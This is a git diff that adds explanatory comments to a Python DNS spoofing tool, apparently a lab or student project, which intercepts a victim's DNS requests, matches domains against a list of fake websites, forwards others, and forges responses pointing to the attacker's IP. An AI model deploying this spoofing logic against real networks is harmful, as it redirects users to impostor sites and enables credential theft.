@@ -8,6 +8,10 @@ from environment import *
 from mac_management import *
 from history import *
 
+
+#
+# Function checking if the pckage has IP and DNS layer.
+#
 def dns_sorting_start(pkt):
 
     websites = WEBSITES
@@ -22,7 +26,9 @@ def dns_sorting_start(pkt):
         dst_ip = pkt[IP].dst
         dns_check(websites, dns, network, pkt, src_ip, dst_ip)
 
-
+#
+# Function checking if the DNS request is part of the one we want to parasitize (checking IP_adress, the domain and website concerned).
+#
 def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
 
     if pkt[DNS].qr == 0 and ipaddress.ip_address(src_ip) in network and dst_ip == dns: #if it's a request we want to block the one from the victim to the dns server
@@ -55,11 +61,17 @@ def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
         #print('-----------------------------------------------------------------------', flush=True)
         forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
 
+#
+# Function that cleans the domain name.
+#
 def remove_trailing_dot(s):
     if s.endswith('.'):
         return s[:-1]
     return s
 
+#
+# Function that checks if there is a fake website for the requested domain name.
+#
 def match_website(websites,domain_name):
     if websites :
         for website in websites:
@@ -67,6 +79,9 @@ def match_website(websites,domain_name):
                 return website
     return False
 
+#
+# Function manually forwarding the dns resquest if it's not one that we want to paratize.
+#
 def forward_dns(pkt, dst_ip):
     
     pkt[IP].chksum = None  
@@ -90,7 +105,9 @@ def forward_dns(pkt, dst_ip):
     #    print(f"Error: Unable to resolve MAC address for {dst_ip}")
         #SINON AFFICHER QU'IL Y A UN PB
 
-
+#
+# Function creating a fake response at a DNS request we want to paratize.
+#
 def create_dns_response(website, dns, network, pkt, req_src_ip, req_dst_ip, domain_name):
     #we just need to switch everything and add the response with our mavelous IP
     iface = str(ATTACK_STATUS['iface'])
